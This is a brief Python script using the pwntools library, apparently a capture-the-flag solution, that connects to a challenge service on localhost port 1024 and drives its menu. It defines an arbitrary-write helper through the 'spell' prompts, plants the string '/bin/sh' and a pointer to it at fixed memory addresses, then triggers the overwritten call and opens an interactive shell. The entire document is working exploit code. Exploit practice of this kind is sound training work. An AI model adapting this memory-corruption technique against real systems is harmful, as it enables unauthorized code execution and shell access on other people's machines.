from pwn import *

def arb_write(x, v):
    r.sendline("2")
    r.recvuntil("aim?\n")
    r.sendline(str(x))
    r.recvuntil("spell?")
    r.sendline(str(len(v)))
    r.recvuntil("words?")
    r.sendline(v)
    r.recvuntil("Casting...\n")

r = remote("localhost", 1024)
r.recvuntil("time\n")

# Writes:
arb_write(0x404ff0, "/bin/sh")
arb_write(0x404070, p64(0x404ff0))

r.sendline("3")
r.interactive()